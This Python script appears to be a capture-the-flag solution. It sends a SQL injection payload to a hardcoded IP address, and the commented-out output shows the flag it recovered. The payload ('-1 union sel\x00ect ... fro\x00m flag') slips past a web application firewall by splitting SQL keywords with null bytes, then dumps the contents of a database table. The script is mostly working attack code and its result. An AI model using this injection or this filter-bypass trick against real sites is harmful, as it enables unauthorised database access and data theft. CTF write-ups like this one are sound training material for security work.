#!/bin/env python
#-*- encoding: utf-8 -*-

import requests
import re
import string
import random
import sys

reload(sys)
sys.setdefaultencoding("utf-8")

req = requests.session()


def post(url, data, headers):
    res = req.post(url=url, data=data, headers=headers)
    if res.status_code == 200:
        return res.content
    else:
        return False


def get(url, headers):
    res = req.get(url=url, headers=headers)
    if res.status_code == 200:
        return res.content
    else:
        return False


def get_1(url, headers):
    res = req.get(url=url, headers=headers)
    if res.status_code == 200:
        return res.content
    else:
        return False


def get_2(url, headers):
    res = req.get(url=url, headers=headers)
    if res.status_code == 200:
        return res.content
    else:
        return False

if __name__ == '__main__':
    url = 'http://202.120.7.203/index.php?id='
    # # & 0 1 2 3 4 5 6 7 8 9 @

    headers = {}

    sql = "-1 union sel\x00ect 1,(sel\x00ect+flag+fro\x00m+flag),3"
    print get(url + sql, headers)
    # <!DOCTYPE html>
    # <html lang="en">
    # <head>
    #     <meta charset="utf-8">
    #     <title>flag{W4f_bY_paSS_f0R_CI}</title>
    # </head>
    # <body>

    #     <h3>flag{W4f_bY_paSS_f0R_CI}</h3>
    #     <div class="main">
    #         3    </div>
    #     <p><a href="index.php?id=1">View article</a></p>

    # </body>
    # </html>
